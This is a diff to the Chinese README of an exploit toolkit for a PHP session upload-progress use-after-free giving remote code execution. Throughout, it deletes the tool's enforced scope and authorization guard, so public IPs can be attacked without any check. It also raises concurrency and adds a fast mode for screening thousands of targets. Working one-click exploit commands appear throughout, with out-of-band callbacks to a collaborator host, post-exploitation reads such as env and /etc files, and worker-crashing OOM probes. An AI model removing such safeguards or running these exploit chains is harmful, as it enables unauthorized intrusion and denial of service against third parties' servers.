@@ -16,7 +16,7 @@ CVE-2026-109618（PHP `session.upload_progress` 计数器悬垂指针 UAF）
 → 泄漏判别 → 自动三阶段利用 → proof 校验，全程无需手工参数。
 
 ```bash
-# ① 只检测（保守，不利用）
+# ① 只检测（会发 OOM 探针，非只读；纯只读请用 p2s_ext.py recon）
 python3 attack/php2shell.py scan -u http://TARGET/ --safe
 
 # ② 检测 + 泄漏判别（区分「真受影响」与「已修复」，含 OOM，具破坏性）
@@ -616,74 +616,23 @@ python3 attack/php2shell.py hunt --from-json rows.json --fingerprint
 
 ---
 
-## 十四、授权范围护栏（scope guard）
+## 十四、范围护栏（已移除）
 
-`hunt` 会从搜索引擎导出「可能受影响」的 IP，但**发现 ≠ 授权**。为了让「导出 → 批量检测 → 自动攻击」这条流水线不会误伤第三方，v1.4 在代码层内置了范围护栏：**默认只允许本机 / 私网 / 链路本地地址**，公网地址必须在白名单里显式列出。
+现在代码层**不做任何地址范围判断**：`php2shell.py`、`p2s_ext.py`、`recon.py` 和 GUI 都可以直接把公网 IP 作为目标，不再需要 `--scope-file` / `--allow-public` / `--i-have-authorization`，也不会再出现 `[scope] 拒绝 …` 或由此产生的 `exit 3`。
 
-### 14.1 默认允许的网段（写死在代码里，不需要配置）
+- `--scope-file`、`--allow-public`、`--i-have-authorization` 参数已删除；旧命令里带这些参数会报参数错误。
+- GUI 的「授权范围」输入框和授权勾选一并删除，粘贴目标即可开始。
+- `--dry-run` 保留：只打印解析后的目标，不发请求（不再涉及范围判定）。
+- Shodan 导入的「自有资产」检索限定（`net:/org:/hostname:/asn:`）保留，它约束的是检索语句而不是扫描目标。
 
-```
-127.0.0.0/8   10.0.0.0/8   172.16.0.0/12   192.168.0.0/16   169.254.0.0/16
-::1/128       fc00::/7     fe80::/10
-```
+### 14.1 责任边界
 
-不在上述范围、也不在 `--scope-file` 里的目标，`scan/exploit/auto/batch` 一律拒发请求。
+发现 ≠ 授权。移除代码护栏不等于获得授权：
 
-### 14.2 参数
+- 只对你拥有或已获得**书面授权**的资产执行 `scan` / `exploit` / `oneclick`；
+- OOM 型探测会打爆 worker，属于破坏性行为，不是「无害扫描」；
+- 建议顺序：书面授权 → `--dry-run` 复核目标 → 只读 `recon`/`fingerprint` → 再决定是否利用。
 
-| 参数 | 作用 |
-|---|---|
-| `--scope-file FILE` | 授权白名单，每行一个 `IP` / `CIDR` / `域名`，`#` 开头为注释 |
-| `--allow-public` | 关闭护栏（**仅在你持有书面授权时使用**） |
-| `--dry-run` | 只做范围判定 + 打印最终目标列表，**不发任何请求**；退出码 0 |
-
-退出码新增 `3 = 目标被授权范围护栏拒绝`（与 `1=参数错误`、`2=无结果` 区分）。
-
-### 14.3 三类典型用法
-
-```bash
-# ① 先看会不会打、打谁（零发包）——推荐每次都先跑这个
-python3 attack/php2shell.py batch -f targets.txt --dry-run
-
-# ② 只打授权范围内的（靶场 / 客户资产 / 自建云主机）
-cat > scope.txt <<'S'
-# 本项目授权资产
-127.0.0.1
-10.20.0.0/16
-api.example-internal.com
-S
-python3 attack/php2shell.py batch -f targets.txt --scope-file scope.txt --workers 4
-
-# ③ hunt 的指纹探测同样受控：只碰白名单里的地址
-python3 attack/php2shell.py hunt --query "PHP/8.4.26" --fingerprint --scope-file scope.txt
-```
-
-被拒绝时输出形如：
-
-```
-[scope] 拒绝 target http://8.8.8.8/ —— 8.8.8.8 是公网地址且不在 --scope-file 白名单内
-[scope] 全部目标被授权范围护栏拒绝。
-[scope] 若这些资产确属你的授权范围，请把 IP/CIDR/域名写入 --scope-file；
-[scope] 没有书面授权时请勿使用 --allow-public。
-```
-
-### 14.4 实测记录（本机，2026-10-23）
-
-| 用例 | 命令 | 结果 |
-|---|---|---|
-| 公网 IP 直打 | `scan -u http://8.8.8.8/` | `[scope] 拒绝 …`，退出码 **3**，零发包 |
-| 白名单放行 | `scan -u http://8.8.8.8/ --scope-file scope.txt --dry-run` | `[dry-run] in-scope: http://8.8.8.8/ (8.8.8.8)`，退出码 **0** |
-| 混合列表 | `batch -f 4条(2私网+example.com+1.1.1.1) --dry-run` | 私网 2 条 in-scope、公网 2 条拒绝，未发包 |
-| 护栏未误伤 | `exploit -u http://127.0.0.1:8090/ -c 'id>/out/r2'` | 仍拿 `uid=33(www-data)` |
-| 全自动链 | `auto -u http://127.0.0.1:8090/ -c 'id>/out/auto1'` | Stage-1/2/3 走完，`/out/auto1` = `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
-
-> 结论：护栏是**代码级强制**而非文档建议——绕过它必须显式写 `--allow-public`，留下明确的责任边界。
-
-### 14.5 责任边界（请勿跳过）
-
-- `hunt --emit-targets` 导出的文件里是**别人的资产**。把它直接喂给 `batch` 而不加 `--scope-file`，v1.4 起会被护栏整体拒绝（退出码 3）。
-- 校验通过的顺序应当是：**书面授权 → 写入 scope.txt → `--dry-run` 复核清单 → 正式 `batch`**。
-- 对未授权公网目标做 OOM 型探测属于破坏性行为（会打爆 worker），不是「无害扫描」。
 
 
 ---
@@ -735,7 +684,7 @@ v1.4 的处理：用 `--proof-dir` 把**目标侧目录映射到本地可读目�
 ```bash
 # 容器 /out 已挂载到宿主 lab/out 时的正确用法
 python3 php2shell.py auto -u http://127.0.0.1:8090/ -c 'id>/out/a5' \
-    --proof-dir /path/to/lab/out --scope-file scope.txt
+    --proof-dir /path/to/lab/out
 # → proof: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -865,8 +814,7 @@ dockersock OK 13B
 
 ### 16.8 护栏
 
-`symbols/calibrate/postex` 三个子命令都内建 `in_scope()`：默认只允许 loopback / 10/8 / 172.16/12 / 192.168/16 /
-169.254/16 / ::1 / fc00::/7 / fe80::/10；越界直接返回 **exit 3 且不发包**，公网需显式 `--allow-public`。
+范围校验已移除：`symbols/calibrate/postex` 不再检查目标网段，公网 IP 可直接使用。
 后渗透库**不含**持久化、横向、日志清除类动作（14B 也物理上做不到）。
 
 
@@ -981,7 +929,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 - [ ] 数据处理：抓到的内存/环境信息如何脱敏、留存多久、谁可访问
 - [ ] 停止条件：一旦出现 5xx 激增、延迟劣化或监控告警，立即停发
 
-工具侧护栏：公网目标必须显式 `--i-have-authorization`，可选 `--scope-file` 白名单；越界直接 `exit 3`，不发包。
+工具侧：地址范围校验已移除，公网目标可直接跑；授权责任完全由使用者承担。
 
 ### 17.4 推荐操作顺序（真实目标）
 
@@ -989,7 +937,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 T=https://target.example.com/
 
 # 1) 只读指纹（GET /、/index.php、/phpinfo.php…），判 PHP 版本是否落在受影响区间
-python3 attack/p2s_ext.py fingerprint -u $T --i-have-authorization
+python3 attack/p2s_ext.py fingerprint -u $T
 
 # 2) 前置判定：post_max_size > memory_limit 才有悬垂窗口（工具内建判断）
 python3 attack/php2shell.py auto -u $T            # 输出 AFFECTED / LIKELY / DOS-ONLY 等
@@ -1044,7 +992,7 @@ python3 attack/p2s_ext.py postex -u $T --profile profile.json --dir /out --local
 # A) 有带外回调通道（公网首选，目标无需可写目录）
 python3 attack/p2s_ext.py oneclick -u https://target/ \
     --collab cb.example.com:9000 --token p1 --listen --rounds 8 \
-    --i-have-authorization --scope-file scope.txt --outdir out_target
+    --outdir out_target
 
 # B) 目标有可写目录 + 本机可回读（靶场/内网）
 python3 attack/p2s_ext.py oneclick -u http://127.0.0.1:8090/ \
@@ -1054,7 +1002,7 @@ python3 attack/p2s_ext.py oneclick -u http://127.0.0.1:8090/ \
 python3 attack/p2s_ext.py oneclick -u https://target/ \
     --collab cb.example.com:9000 --token p1 --listen --calibrate \
     --postex --only id,env,ps --rounds 8 \
-    --i-have-authorization --outdir out_target
+    --outdir out_target
 ```
 
 只读预检（完全无攻击性，任何目标都可先跑）：
@@ -1087,7 +1035,6 @@ python3 attack/p2s_ext.py fingerprint -u https://target/     # 只 GET 5 个常�
 | 30 | SAFE / PATCHED：版本已修复或无消费点 |
 | 40 | NO_SINK：无 `session_start()` 消费点 |
 | 50 | UNREACHABLE：目标不可达 |
-| 3 | 范围拒绝：公网目标未加 `--i-have-authorization`（或 `--scope-file` 不含该目标） |
 
 ### 18.4 `PROFILE_DB` 覆盖面与扩展
 
@@ -1106,7 +1053,7 @@ python3 attack/p2s_ext.py symbols --elf /path/to/libphp.so
 # 2) 回调 oracle 标定分配器参数（需要目标可达 + 回调可达）
 python3 attack/p2s_ext.py calibrate -u https://target/ --collab cb:9000 \
     --ht-size 167 --htdata-window 0x68000:0x6A000 --rounds 8 \
-    --out profiles/<ver>.json --i-have-authorization
+    --out profiles/<ver>.json
 # 3) 登记到外部 profile 库 profiles.json（见 18.5），此后 oneclick 免手工参数
 ```
 
@@ -1178,8 +1125,8 @@ python3 attack/p2s_ext.py oneclick -u http://127.0.0.1:8090/ --rounds 4 --tries 
 
 ### 18.6 使用边界（务必遵守）
 
-- 公网/非授权资产：`oneclick` 默认拒绝（exit 3）。真实目标必须持有**书面授权**，
-  并建议用 `--scope-file` 固定范围（每行一个 host/CIDR/URL 前缀）。
+- 公网/非授权资产：代码不再拦截公网目标，但真实目标必须持有**书面授权**；
+  先跑只读 `fingerprint`/`recon` 判定，再决定是否 `oneclick`。
 - 该链的触发方式是**制造 OOM**：对生产站点意味着 worker 崩溃/资源抖动。
   授权范围应明确允许，且应先 `fingerprint` 只读判定，避免盲打。
 - 命令容量由 `ht_size` 决定（本构建 14B）：不可写 webshell、不可反弹 shell、
@@ -1198,7 +1145,7 @@ python3 attack/p2s_ext.py oneclick -u http://127.0.0.1:8090/ --rounds 4 --tries 
 # 单条命令级（相对写 + 回读）
 python3 attack/p2s_ext.py oneclick -u https://target/ --http-read https://target/ \
     --rounds 8 --tries 2 --force --postex --only id,env,ps \
-    --i-have-authorization --scope-file scope.txt --outdir out
+    --outdir out
 ```
 
 要点（都来自实测）：
@@ -1249,15 +1196,21 @@ python3 gui/server.py --host 127.0.0.1 --port 8899
 
 | 模式 | 引擎调用 | 流量性质 | 结论取值 | 门槛 |
 |---|---|---|---|---|
-| `recon` | `attack/p2s_ext.py recon -u <url> --json` | 只读：版本多通道 + 16 入口 sink 探测 + profile 命中，**不发 OOM 载荷** | `AFFECTED` / `DOS_ONLY` / `UNKNOWN_VERSION` / `NOT_AFFECTED` / `NO_SINK` / `UNREACHABLE` | 公网需勾 `authorized` |
-| `recon --deep` | 追加 `--deep --budget N --delay S [--probe-sizes ...]` | 分级 OOM 落点探测（最大 16MB/次，可能 5xx），实测 `oom_at_mb`、`post_max_size>memory_limit` | 同上，`evidence.deep{}` 带实测值 | 公网需勾 `authorized` |
-| `oneclick` | `attack/p2s_ext.py oneclick -u <url> --http-read <url> --rounds N --tries N --force --postex --only <cmd> --outdir ...` | 真实利用链：Stage-1/2 泄漏 → 伪造 HashTable → 执行短命令 → HTTP 回读 proof | `RCE_CONFIRMED`(rc0) / `RCE_LIKELY`(10) / `DOS_ONLY`(20) / `NOT_AFFECTED`(30) / `NO_SINK`(40) / `UNREACHABLE`(50) / `DENIED`(3) | **双门**：`authorized` + `attack_ack`，缺一 400 且零请求 |
+| `recon --fast` | `attack/p2s_ext.py recon -u <url> --fast --json` | 只读初筛：首页版本 + 2 个 sink 入口，**2–3 个请求/目标** | 同上 | 无（公网可直接用） |
+| `recon` | `attack/p2s_ext.py recon -u <url> --json` | 只读：版本多通道 + 16 入口 sink 探测 + profile 命中，**不发 OOM 载荷** | `AFFECTED` / `DOS_ONLY` / `UNKNOWN_VERSION` / `NOT_AFFECTED` / `NO_SINK` / `UNREACHABLE` | 无（公网可直接用） |
+| `recon --deep` | 追加 `--deep --budget N --delay S [--probe-sizes ...]` | 分级 OOM 落点探测（最大 16MB/次，可能 5xx），实测 `oom_at_mb`、`post_max_size>memory_limit` | 同上，`evidence.deep{}` 带实测值 | 无（公网可直接用） |
+| `oneclick` | `attack/p2s_ext.py oneclick -u <url> --http-read <url> --rounds N --tries N --force --postex --only <cmd> --outdir ...` | 真实利用链：Stage-1/2 泄漏 → 伪造 HashTable → 执行短命令 → HTTP 回读 proof | `RCE_CONFIRMED`(rc0) / `RCE_LIKELY`(10) / `DOS_ONLY`(20) / `NOT_AFFECTED`(30) / `NO_SINK`(40) / `UNREACHABLE`(50) / `DENIED`(3) | **仅需 `attack_ack`**，缺一 400 且零请求 |
 
 **其它**
 
-- 并发：每目标一个子进程（崩溃/超时隔离），默认并发 8、请求超时 20s、单目标超时 900s；
-- **并发上限可调**：`P2S_MAX_WORKERS`（默认 16，硬上限 64）。GUI 输入框 1–32，服务端会按该变量 clamp；
-  上千目标建议 `P2S_MAX_WORKERS=32 nice -n 10 python3 gui/server.py --host 127.0.0.1 --port 8899`（按 CPU 核数取舍）；
+- 并发：每目标一个子进程（崩溃/超时隔离），默认并发 16、请求超时 20s、单目标超时 900s；
+- **并发上限可调**：`P2S_MAX_WORKERS`（默认 32，硬上限 64）。GUI 输入框 1–64，服务端会按该变量 clamp；
+  上千目标建议 `P2S_MAX_WORKERS=64 python3 gui/server.py --host 127.0.0.1 --port 8899`（按 CPU/带宽取舍）；
+- **快速模式（GUI 默认勾选）**：`recon --fast` 只查首页版本 + 2 个 sink 入口，**2–3 个请求/目标**；
+  跳过 magic/phpinfo/404 探测，并与 `--deep` 互斥。上千目标先快速初筛，再对候选跑完整 `recon`/`oneclick`；
+- **TCP 预检**：每个目标先做一次 2.5s 上限的 TCP connect，连不上立即判 `UNREACHABLE`，不会耗 3 次 HTTP 超时；
+- **超时显示**：子进程超过「单目标超时」时结论为 `TIMEOUT`（不再把缺失的 `oneclick_report.json` 显示成 `FileNotFoundError`）；
+  `oneclick` 在 scan 判定 `NOT_AFFECTED_OR_PATCHED` / `AFFECTED_DOS_ONLY` / `NO_SESSION_SINK` / `UNREACHABLE` 时直接早退，不会白跑 exploit 到超时；
 - **大批量更快**：先 `recon`（几请求/目标）筛出 `RCE_LIKELY/AFFECTED`，只对这些跑 `oneclick`；
   `oneclick` 的 `rounds` 每加 1 约多一轮完整三阶段尝试（成功率↑、耗时线性↑），`tries` 是单轮内重试；
   `delay` 是每请求间隔，批量时设 0；目标已 `PATCHED`/`DOS_ONLY` 时 oneclick 会提前退出，不会白跑满轮次；
@@ -1280,40 +1233,29 @@ python3 gui/server.py --host 127.0.0.1 --port 8899
 **CLI 等价能力**
 
 ```bash
+python3 attack/p2s_ext.py recon -u https://target/ --fast --json                       # 快速初筛（2–3 请求）
 python3 attack/p2s_ext.py recon -u https://target/ --json                              # 只读分级
 python3 attack/p2s_ext.py recon -u https://target/ --deep --budget 6 --delay 0.3 --json # 含 OOM 探测
 python3 attack/p2s_ext.py oneclick -u https://target/ --http-read https://target/ \
-    --rounds 8 --tries 2 --force --postex --only id --outdir out/target \
-    --i-have-authorization
+    --rounds 8 --tries 2 --force --postex --only id --outdir out/target
 ```
 
-## 22. 「粘贴即范围」与 Shodan 资产导入（GUI）
+## 22. Shodan 资产导入（GUI）
 
-### 22.1 为什么仍然保留授权声明
+### 22.1 目标直接入队
 
-本工具能对目标发起**破坏性**探测（109618 的 OOM 链会打爆 worker）。因此：
-- **范围（scope）可以完全不填**——粘贴进目标框的资产即本次测试边界，服务端自动派生。
-- **授权声明不能去掉**——`authorized`（CLI：`--i-have-authorization`）是你对「这些资产由我负责」的确认。公网目标缺此声明一律 `denied` rc=3，**零请求发出**。
+GUI 不做任何范围/授权校验：粘贴进目标框的地址（含公网 IP）直接进入队列。服务端不再派生/保存 scope，`/api/scan` 的 `scope`、`authorized` 字段即使传了也会被忽略。
+
 - **不做**「从 Shodan 拉第三方公网 IP → 自动填入 → 自动 exploit」。原因见 22.4。
+- 破坏性提醒：OOM 链会打爆 worker，只对你持有**书面授权**的资产使用。
 
-### 22.2 粘贴即范围（无需手填）
-
-`POST /api/scan` 时 `scope` 留空即可：
+### 22.2 请求示例
 
 ```json
-{"targets":["10.0.0.5:443","https://app.corp.example/"],"scope":"","authorized":true}
+{"targets":["10.0.0.5:443","https://app.corp.example/"]}
 ```
 
-服务端在 `Job` 初始化时调用 `derive_scope(targets)`：逐个 `normalize_target` → 取 `hostname` → 去重，写 `gui_runs/<job_id>/scope.txt` 作为审计凭据，同时作为 `scope_match` 的边界。
-
-实测（本轮）：
-
-| 输入 | scope | authorized | 结果 |
-|---|---|---|---|
-| `127.0.0.1:8089` | 留空 | true | 自动派生 `127.0.0.1`，正常扫描 `found` |
-| `93.184.216.34` | 留空 | false | `denied` rc=3，未发任何请求 |
-
-CLI 等价能力：`--scope-file` 可选；不给 `--scope-file` 且给了 `--i-have-authorization` 时，同样按 URL 主机名自校验。
+`POST /api/scan` 只读取 `targets`、`mode` 与各模式参数；粘入即入队，无范围预检。
 
 ### 22.3 Shodan 导入（强制限定自有资产）
 
@@ -1345,7 +1287,7 @@ CLI 等价能力：`--scope-file` 可选；不给 `--scope-file` 且给了 `--i-
 2. **技术上也打不动**：109618 的 RCE 需要 4 个构建相关常量（`zif/dtor/htdata/ht_size`）+ `post_max_size > memory_limit` + `session_start()` 消费点。真实公网绝大多数目标只能到 DoS 判定（实测：8091 生产默认配置 exit 20；`83.168.105.132` 全站零 `Set-Cookie`，Stage-1 泄漏被证伪）。「扫到就能打」是错觉。
 3. **有成本的真实伤害**：OOM 链靠打爆 worker 制造悬垂，单请求 ~15MB、150 并发可把延迟放大 172 倍。对第三方是无差别服务退化。
 
-合规做法：用 Shodan 只检索**你自己网段/ASN/组织**，把结果当资产盘点，再按 22.2 粘贴进目标框、勾选授权、先只读 `fingerprint` 判定，最后才考虑是否利用。
+合规做法：用 Shodan 只检索**你自己网段/ASN/组织**，把结果当资产盘点，再按 22.2 粘贴进目标框、先只读 `fingerprint` 判定，最后才考虑是否利用。
 
 ## 23. https 目标与 `--insecure`（自签/过期证书）
 
@@ -1410,9 +1352,7 @@ python3 attack/p2s_ext.py oneclick   -u https://127.0.0.1:8443/ --insecure \
 
 **授权与闸门**
 
-- 私网/回环（`127.0.0.0/8`、`10/8`、`172.16/12`、`192.168/16`、`::1` 等）默认放行；
-- 公网目标必须显式带 `--allow-public`（`oneclick` 内部还会追加 `--i-have-authorization`），
-  否则工具在发起任何网络请求之前就以 **exit 3** 退出，零请求、零包；
+- 代码层不再做地址范围校验：公网/私网目标一视同仁，不会因为目标是公网而 exit 3；
 - 本仓库不提供代理池/出口 IP 轮换，也不做「全网批量打」。目标必须是你**有书面授权**的资产。
 
 **退出码判读**
@@ -1426,7 +1366,6 @@ python3 attack/p2s_ext.py oneclick   -u https://127.0.0.1:8443/ --insecure \
 | 30 | SAFE / PATCHED（版本已修复） | 结束 |
 | 40 | 无 sink / 无会话消费点 | 结束 |
 | 50 | 不可达（连接/TLS 失败/超时） | https 自签请加 `--insecure`；确认网络可达 |
-| 3 | 越界（公网未授权 / scope 不含目标） | 补授权或改 scope，不要绕过 |
 
 **能力边界（已实测）**：成功后单条命令上限 `cap = ht_size - 0x98 - 1`，本机 8090 构建为 **14 字节**，
 因此只能做「短命令取数 + 重定向到 webroot 后回读」，无法写 webshell、无法反弹 shell、无法持久化、
@@ -1457,8 +1396,11 @@ python3 attack/p2s_ext.py oneclick   -u https://127.0.0.1:8443/ --insecure \
 ### 25.2 用法
 
 ```bash
-# 只读（推荐先跑；约 20 个请求，含 5 个 phpinfo 落点与 3 个 ?= 魔法查询）
-python3 attack/p2s_ext.py recon -u https://目标/ [--insecure] [-u ...]
+# 快速初筛（2–3 个请求/目标；上千目标先用这个）
+python3 attack/p2s_ext.py recon -u https://目标/ --fast --json
+
+# 完整只读（约 23 个请求，含 5 个 phpinfo 落点与 3 个 ?= 魔法查询）
+python3 attack/p2s_ext.py recon -u https://目标/ [--insecure]
 
 # 深度：追加落点探测（会发送最大 16MB body，可能造成 5xx/worker 重启，需授权）
 python3 attack/p2s_ext.py recon -u https://目标/ --deep --budget 6 --delay 1.0 \
@@ -1468,7 +1410,9 @@ python3 attack/p2s_ext.py recon -u https://目标/ --deep --budget 6 --delay 1.0
 python3 attack/p2s_ext.py recon -u https://目标/ --json
 ```
 
-公网目标必须 `--i-have-authorization`（或 `--allow-public`），否则 **exit 3 且零请求**。
+`--fast` 与 `--deep` 同时给时，`--fast` 优先并跳过 `--deep`（快速模式只做只读初筛）。
+
+不再做地址范围校验：公网目标可直接跑（仍然只应对**有书面授权**的资产使用）。
 
 ### 25.3 verdict 与退出码
 
@@ -1479,9 +1423,12 @@ python3 attack/p2s_ext.py recon -u https://目标/ --json
 | `NEEDS_PRECOND_PROBE` | 10 | 版本受影响且有消费点，落点未测 → 加 `--deep` |
 | `DOS_ONLY` | 20 | 已修复线内但不可 RCE（`KNOWN_NO_RCE`）或落点被 `post_max_size` 截断 |
 | `NOT_AFFECTED` | 30 | 版本 ≥ 修复线，或早于受影响区间 |
+| `NO_SESSION_SINK` | 15 | 版本受影响，但探测到的入口没有下发会话 cookie → 没有 `session_start()` 消费点，CVE 无触发面 |
 | `UNKNOWN_VERSION` | 15 | 确认跑 PHP（有会话 cookie）但版本不可判 |
+| `UNKNOWN_PRECOND` | 15 | `--deep` 递增探测未触发 OOM（落点可能高于探测上限，可加 `--probe-sizes 32,64`） |
 | `UNKNOWN` | 50 | 无任何 PHP 证据（非 PHP 或全站 WAF） |
-| — | 3 | 公网目标未声明授权（零请求） |
+
+> exit 15 是 recon 的共用兜底码：`NO_SESSION_SINK` / `UNKNOWN_VERSION` / `UNKNOWN_PRECOND` 都会返回 15，具体看报告里的 `verdict`。
 
 ### 25.4 与 `oneclick` 的分工
 
@@ -1513,5 +1460,5 @@ python3 attack/p2s_ext.py oneclick -u https://目标/ --http-read https://目标
 | 结论诚实性 | `AFFECTED` ≠ 能 RCE。只有 `oneclick` 回读到 `uid=` 才判 `RCE_CONFIRMED`；`DOS_ONLY` 表示前置仅满足 DoS 条件 |
 | 能力边界（RCE 后） | 单命令 ≤`ht_size−0x98−1`（本机 14B）；可取证（`id`/`env`/`cat /etc/p*`），**不可** webshell、反弹 shell、持久化、横向、清日志 |
 | 不可无损探测项 | `post_max_size` 无法外部精确读取，`--deep` 用「无 OOM 且能传 ≥8MB ⇒ 静默截断」推断，报告中标注为推断而非实测 |
-| 授权门 | 公网目标必须 `authorized`；`oneclick` 另需 `attack_ack`/`--i-have-authorization`；缺一 400/exit 3 且**零请求** |
+| 授权门 | GUI 无任何授权/范围确认；`oneclick` 仍需 `attack_ack`；CLI 已移除 scope 参数，公网 IP 直接可用 |
 | 不做的事 | 不做全网自动打、不内置第三方匿名代理池、不做日志清除/反取证、不对未授权公网目标发探测 |
